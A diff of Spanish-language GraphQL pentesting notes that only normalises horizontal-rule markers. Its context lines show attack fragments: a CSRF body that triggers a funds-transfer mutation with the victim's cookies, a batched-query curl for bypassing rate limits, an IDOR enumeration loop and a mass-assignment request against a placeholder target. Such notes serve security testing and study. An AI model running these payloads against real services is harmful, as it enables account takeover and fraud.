@@ -23,7 +23,7 @@ linked:
 ---
 # GraphQL - Auth y Lógica
 
-***
+---
 
 ## CSRF en GraphQL
 
@@ -48,7 +48,7 @@ linked:
 
 Body literal: `{"query":"mutation{transferFunds(to:\"attacker\",amount:1000)}","_":"=" }`. Backend parsea JSON con tolerancia → mutation con cookies de la victim.
 
-___
+---
 
 ## Query Batching para Bypass Rate Limit / Auth
 
@@ -81,7 +81,7 @@ QUERY+='}'
 curl -X POST -H "Content-Type: application/json" -d "{\"query\":\"$QUERY\"}" https://target/graphql | jq '.. | .success? | select(. == true)'
 ```
 
-___
+---
 
 ## IDOR via Global IDs
 
@@ -111,7 +111,7 @@ for i in $(seq 1 1000); do
 done
 ```
 
-___
+---
 
 ## Mass Assignment via Mutations
 
@@ -149,4 +149,4 @@ curl -X POST -H "Content-Type: application/json" \
   https://target/graphql
 ```
 
-***
+---
